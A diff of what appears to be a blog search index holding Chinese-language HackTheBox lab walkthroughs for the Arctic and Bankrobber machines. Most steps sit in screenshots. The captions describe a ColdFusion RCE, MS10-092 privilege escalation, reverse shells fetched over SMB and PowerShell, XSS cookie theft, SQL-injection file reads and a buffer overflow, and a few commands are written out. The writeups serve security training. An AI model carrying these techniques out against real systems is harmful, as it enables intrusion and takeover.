@@ -126,6 +126,193 @@
       </tags>
   </entry>
   <entry>
+    <title>Arctic - HackTheBox</title>
+    <url>/post/d18aaee76b2d/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1hrbrd274nvk.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ahdn0afe220.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2yxgt46bvf20.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3088jk1uiau0.webp"
+                     
+                ></p>
+<p>这8500端口扫出了个啥玩意，尝试一下浏览器访问</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5vh5kw0bjck0.webp"
+                     
+                ></p>
+<p>虽然是个http，但访问起来真的好慢啊</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7ktsu7fmyq40.webp"
+                     
+                ></p>
+<p>这个页面发现一个administrator，感觉是个管理页面</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7akgnjbmgso0.webp"
+                     
+                ></p>
+<p>虽然不知道密码，但知道了cms名称为ColdFusion，版本为8，搜一下有无exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2r1zlsrfnhy0.webp"
+                     
+                ></p>
+<p>刚好这有个rce</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6yl6ul3oyh80.webp"
+                     
+                ></p>
+<p>修改一下exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.669ecjxz4580.webp"
+                     
+                ></p>
+<p>提权，由于反弹回来的shell是cmd，并不是powershell，所以无法远程下载提权检测脚本</p>
+<p>利用<code>impacket-smbserver -smb2support root &#39;&#39;</code>开启一个文件共享</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.404h8nq64uw0.webp"
+                     
+                ></p>
+<p><code>copy \\10.10.14.17\root\winPEAS.bat</code>，传输到靶机</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.27b2uankezrw.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2cd4zze2rjvo.webp"
+                     
+                ></p>
+<p>靶机为windows 2008 R2</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.56zb7jzy8640.webp"
+                     
+                ></p>
+<p>没有打任何补丁</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.xcvt83zvnao.webp"
+                     
+                ></p>
+<p>一大堆提权方法，随便挑了一个MS10-092</p>
+<p><code>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092</code></p>
+<p>这个提权工具是利用vb脚本，利用at写入一个计时任务，添加一个管理员用户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1pxmvphy7z1c.webp"
+                     
+                ></p>
+<p>下载下来尝试利用</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.s0hgk17qcww.webp"
+                     
+                ></p>
+<p><code>cscript test.wsf</code>，执行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ppmjv60ezy0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.63za2cu3joo0.webp"
+                     
+                ></p>
+<p>貌似并没有执行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3r1a6sgzbm20.webp"
+                     
+                ></p>
+<p>这个脚本的计时任务居然是每月一次，这有什么用，修改一下</p>
+<p>索性直接修改为定时执行反弹shell吧，msf生成一个反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.64iha6gw1hk0.webp"
+                     
+                ></p>
+<p>将反弹shell下载到靶机</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5pkh0ozv1ao0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.33xczeb2haw0.webp"
+                     
+                ></p>
+<p>修改为每分钟执行一次反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2xkj39p1i0a0.webp"
+                     
+                ></p>
+<p>执行之后立马就弹回来了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6zuz4xm1jd80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6mooap3u2zo0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Admirer - HackTheBox</title>
     <url>/post/817e25a1d628/</url>
     <content><![CDATA[<p><img  
@@ -443,193 +630,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Arctic - HackTheBox</title>
-    <url>/post/d18aaee76b2d/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1hrbrd274nvk.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ahdn0afe220.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2yxgt46bvf20.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3088jk1uiau0.webp"
-                     
-                ></p>
-<p>这8500端口扫出了个啥玩意，尝试一下浏览器访问</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5vh5kw0bjck0.webp"
-                     
-                ></p>
-<p>虽然是个http，但访问起来真的好慢啊</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7ktsu7fmyq40.webp"
-                     
-                ></p>
-<p>这个页面发现一个administrator，感觉是个管理页面</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7akgnjbmgso0.webp"
-                     
-                ></p>
-<p>虽然不知道密码，但知道了cms名称为ColdFusion，版本为8，搜一下有无exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2r1zlsrfnhy0.webp"
-                     
-                ></p>
-<p>刚好这有个rce</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6yl6ul3oyh80.webp"
-                     
-                ></p>
-<p>修改一下exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.669ecjxz4580.webp"
-                     
-                ></p>
-<p>提权，由于反弹回来的shell是cmd，并不是powershell，所以无法远程下载提权检测脚本</p>
-<p>利用<code>impacket-smbserver -smb2support root &#39;&#39;</code>开启一个文件共享</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.404h8nq64uw0.webp"
-                     
-                ></p>
-<p><code>copy \\10.10.14.17\root\winPEAS.bat</code>，传输到靶机</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.27b2uankezrw.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2cd4zze2rjvo.webp"
-                     
-                ></p>
-<p>靶机为windows 2008 R2</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.56zb7jzy8640.webp"
-                     
-                ></p>
-<p>没有打任何补丁</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.xcvt83zvnao.webp"
-                     
-                ></p>
-<p>一大堆提权方法，随便挑了一个MS10-092</p>
-<p><code>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092</code></p>
-<p>这个提权工具是利用vb脚本，利用at写入一个计时任务，添加一个管理员用户</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1pxmvphy7z1c.webp"
-                     
-                ></p>
-<p>下载下来尝试利用</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.s0hgk17qcww.webp"
-                     
-                ></p>
-<p><code>cscript test.wsf</code>，执行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ppmjv60ezy0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.63za2cu3joo0.webp"
-                     
-                ></p>
-<p>貌似并没有执行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3r1a6sgzbm20.webp"
-                     
-                ></p>
-<p>这个脚本的计时任务居然是每月一次，这有什么用，修改一下</p>
-<p>索性直接修改为定时执行反弹shell吧，msf生成一个反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.64iha6gw1hk0.webp"
-                     
-                ></p>
-<p>将反弹shell下载到靶机</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5pkh0ozv1ao0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.33xczeb2haw0.webp"
-                     
-                ></p>
-<p>修改为每分钟执行一次反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2xkj39p1i0a0.webp"
-                     
-                ></p>
-<p>执行之后立马就弹回来了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6zuz4xm1jd80.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6mooap3u2zo0.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Armageddon - HackTheBox</title>
     <url>/post/0d669e781980/</url>
     <content><![CDATA[<p><img  
@@ -855,315 +855,6 @@
                      lazyload
                      alt="image"
                      data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.4xn21mkgea00.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bankrobber - HackTheBox</title>
-    <url>/post/6d3d0a61ddb1/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.kulvo4r5en4.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.10z1ws9r97s0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3kwx52engda0.webp"
-                     
-                ></p>
-<p>访问80</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3ik8p0y4vje0.webp"
-                     
-                ></p>
-<p>一个比特币交易的cms</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5n0b6ccwqb40.webp"
-                     
-                ></p>
-<p>有登录和注册两个功能，先注册一个进去</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.29eejg50xvy8.webp"
-                     
-                ></p>
-<p>发现一个转账交易框，下方留言处貌似有xss，应该可以获取到管理员的cookie</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2zkwg52zs460.webp"
-                     
-                ></p>
-<p>将xss语句进行url编码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7gd7fcvgdbg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.41f8z3lqg2u0.webp"
-                     
-                ></p>
-<p>解码后得知管理员的账号密码为admin和Hopelessromantic</p>
-<p>退出登录管理员账户</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.4seskju6jjm0.webp"
-                     
-                ></p>
-<p>一个查询用户，一个查询后门</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.16dwvorglzcw.webp"
-                     
-                ></p>
-<p>查询后门这里不支持web端请求，试试用户查询处</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.742wm5r8em40.webp"
-                     
-                ></p>
-<p>有sql注入</p>
-<p>数据库并并没有发现有利用价值的信息，尝试一下用sql注入读取文件</p>
-<p>先确定一下目录路径</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1nbi564ns5uo.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2rcbss3r9hw0.webp"
-                     
-                ></p>
-<p>知道了路径后进行读取</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6z6k1tcawmo0.webp"
-                     
-                ></p>
-<p>读取一下查询后门那个php文件，看下源码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6z6k1tcawmo0.webp"
-                     
-                ></p>
-<p>貌似是无法从web端绕过了</p>
-<p>尝试用xss进行一个绕过执行</p>
-<p><code>https://stackoverflow.com/questions/6396101/pure-javascript-send-post-data-without-a-form</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1n2qnxruwl34.webp"
-                     
-                ></p>
-<p>修改一下这段javascript代码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1g67txuge83k.webp"
-                     
-                ></p>
-<p>把content-type类型修改为与web请求一致的类型</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2dohqeo3sat.webp"
-                     
-                ></p>
-<p>之后让其post请求命令执行的php文件地址，在将执行的参数修改为powershell远程加载反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6ivpm3bpb6o0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7kdr1vru0o00.webp"
-                     
-                ></p>
-<p>同样进行url编码后发送</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3d56mwkzxxk0.webp"
-                     
-                ></p>
-<p>本地监听</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2rd7flbdgfo.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1uft0b1p40w0.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.d7zp70dn4c0.webp"
-                     
-                ></p>
-<p>提权检测脚本未检测出可利用的提权方法</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2olkglpq32k0.webp"
-                     
-                ></p>
-<p>发现一个奇怪的910端口，他是开放的，但无法访问也没有被扫描到</p>
-<p>将其映射到本地访问，使用chisel进行端口映射</p>
-<p><code>https://github.com/jpillora/chisel</code></p>
-<p>下载windows和linux两个文件</p>
-<p>将windows的上传到靶机</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2tld39wquvq0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.9hajlros1zo.webp"
-                     
-                ></p>
-<p>powershell执行不了，msf生一个反弹shell，弹一个cmd的回来</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1031vqvrsyls.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7hkc093g5d80.webp"
-                     
-                ></p>
-<p>访问本地9910看下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1e04vq4yxzs0.webp"
-                     
-                ></p>
-<p>貌似不是直接web请求，nc尝试一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.17vvdm0b89i8.webp"
-                     
-                ></p>
-<p>需要一个密码</p>
-<p>四位密码，尝试爆破一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.51g49uar1uw0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.76xlqplxta00.webp"
-                     
-                ></p>
-<p>密码为0021</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2aw9hrg5rh5w.webp"
-                     
-                ></p>
-<p>又要输入一个数字</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3nt3frb3zpw0.webp"
-                     
-                ></p>
-<p>貌似执行了一个文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1cn02ns8xlts.webp"
-                     
-                ></p>
-<p>但是无权修改</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6x7yhwtauks0.webp"
-                     
-                ></p>
-<p>貌似这里可以进行覆盖，达到让其任意执行的目的，但不知道具体到多少才会覆盖</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.483llismymc0.webp"
-                     
-                ></p>
-<p>好嘛，玩崩了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.40vr4g5skkq0.webp"
-                     
-                ></p>
-<p>得到最大值为32，32以后的地方就会被覆盖</p>
-<p>让其执行msf的反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1libjs435j0g.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.132yvldh0asg.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5askizlbt680.webp"
                      
                 ></p>
 ]]></content>
@@ -1516,6 +1207,315 @@
                      lazyload
                      alt="image"
                      data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bart/image.2t8d6ua6gqw0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bankrobber - HackTheBox</title>
+    <url>/post/6d3d0a61ddb1/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.kulvo4r5en4.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.10z1ws9r97s0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3kwx52engda0.webp"
+                     
+                ></p>
+<p>访问80</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3ik8p0y4vje0.webp"
+                     
+                ></p>
+<p>一个比特币交易的cms</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5n0b6ccwqb40.webp"
+                     
+                ></p>
+<p>有登录和注册两个功能，先注册一个进去</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.29eejg50xvy8.webp"
+                     
+                ></p>
+<p>发现一个转账交易框，下方留言处貌似有xss，应该可以获取到管理员的cookie</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2zkwg52zs460.webp"
+                     
+                ></p>
+<p>将xss语句进行url编码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7gd7fcvgdbg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.41f8z3lqg2u0.webp"
+                     
+                ></p>
+<p>解码后得知管理员的账号密码为admin和Hopelessromantic</p>
+<p>退出登录管理员账户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.4seskju6jjm0.webp"
+                     
+                ></p>
+<p>一个查询用户，一个查询后门</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.16dwvorglzcw.webp"
+                     
+                ></p>
+<p>查询后门这里不支持web端请求，试试用户查询处</p>
+<p><img  
+                     lazyload
+                     alt="image"
